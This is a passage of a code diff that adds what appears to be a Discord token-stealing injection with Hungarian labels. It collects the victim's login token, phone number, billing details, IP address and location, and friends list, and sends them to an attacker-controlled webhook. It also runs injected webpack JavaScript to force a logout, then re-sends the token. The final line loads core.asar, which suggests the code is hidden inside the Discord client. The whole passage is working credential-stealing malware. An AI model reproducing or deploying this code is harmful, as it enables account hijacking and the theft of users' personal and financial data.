+                            },
+                            {
+                                name: "Telefonszám",
+                                value: `\`\`\`${userInfo.phone ?? "Nincs"}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "Nitro típus",
+                                value: `${getNitro(userInfo.premium_type)}`,
+                                inline: false
+                            }, {
+                                name: "Számlázás",
+                                value: `${billing}`,
+                                inline: true
+                            }, {
+                                name: "Szelvények",
+                                value: `${getBadges(userInfo.flags)}`,
+                                inline: false
+                            },
+                            {
+                                name: "Belépési azonosító",
+                                value: `\`\`\`${token}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "Kliens verzió",
+                                value: `\`\`\`${getDiscordClient()}\`\`\``,
+                                inline: false
+                            }, {
+                                name: "Csatlakozási adatok",
+                                value: `\`\`\`yaml\nIP Cím: ${network_data['ip'] ?? "Ismeretlen"}\nSzolgáltató: ${network_data['hostname'] ?? "Ismeretlen"}\nVáros: ${network_data['city'] ?? "Ismeretlen"}\nRégió: ${network_data['region'] ?? "Ismeretlen"}\nOrszág: ${network_data["country"] ?? "Ismeretlen"}\nIdőzóna: ${network_data["timezone"] ?? "Ismeretlen"}\`\`\``,
+                                inline: false
+                            }
+                        ],
+                    }), createEmbed({
+                        description: `**Összes barát (${friends['length']})**\n\n${friends.frien}`,
+                        thumbnail: {
+                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        author: {
+                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                            url: config.embed.href,
+                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                    })]
+                })
+            }
+
+        }
+
+        if (config.logout && token) {
+            await execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true).then((result) => {});
+
+            if (config.notify_on_logout) {
+                sendToWebhook({
+                    username: config.embed.username,
+                    avatar_url: config.embed.avatar_url,
+                    embeds: [createEmbed({
+                        title: "Felhasználó kijelentkeztetve",
+                        url: config.embed.href,
+                        author: {
+                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
+                            url: config.embed.href,
+                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        thumbnail: {
+                            url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                        },
+                        fields: [{
+                                name: "Nitro típus",
+                                value: `${getNitro(userInfo.premium_type)}`,
+                                inline: false
+                            }, {
+                                name: "Számlázás",
+                                value: `${billing}`,
+                                inline: true
+                            }, {
+                                name: "Szelvények",
+                                value: `${getBadges(userInfo.flags)}`,
+                                inline: false
+                            },
+                            {
+                                name: "Belépési azonosító",
+                                value: `\`\`\`${token}\`\`\``,
+                                inline: false
+                            },
+                        ]
+                    })]
+                })
+            }
+
+        }
+    }
+}
+
+module.exports = require("./core.asar");
